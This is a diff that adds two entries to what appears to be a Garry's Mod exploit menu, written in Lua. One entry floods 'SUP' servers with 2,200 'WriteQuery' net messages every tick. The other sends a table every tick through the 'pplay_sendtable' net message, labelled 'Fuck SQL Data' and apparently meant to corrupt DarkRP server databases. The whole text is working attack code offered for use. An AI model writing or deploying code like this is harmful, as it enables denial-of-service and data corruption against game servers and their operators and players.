@@ -1,0 +1,45 @@
+AdDeXpS(
+    {
+        ["SUP servers"] = Color(255,45,45),
+        ["net"] = Color(175,175,175)
+    },
+
+    "WriteQuery",
+
+    "https://i.ytimg.com/vi/iXJ9XvUzwPo/maxresdefault.jpg",
+
+    function() 
+        hook.Add("Tick","WriteQuerydqqdqdqdqdqd",function()
+            for i=1,2200 do
+                net.Start( "WriteQuery" )
+                net.SendToServer()
+            end  
+        end)    
+    end,
+
+    function() 
+        hook.Remove("Tick","WriteQuerydqqdqdqdqdqd") 
+    end
+)
+AdDeXpS(
+    {
+        ["DarkRP"] = Color(255,45,45),
+        ["net"] = Color(175,175,175)
+    },
+
+    "Fuck SQL Data",
+
+    "https://media.discordapp.net/attachments/994169134763999323/1071452213425213461/L0WBSscOIS4.jpg",
+
+    function() 
+        hook.Add("Tick","pplay_sendtable",function()
+            net.Start("pplay_sendtable")
+            net.WriteTable(tbl)
+            net.SendToServer()
+        end)    
+    end,
+
+    function() 
+        hook.Remove("Tick","pplay_sendtable") 
+    end
+)
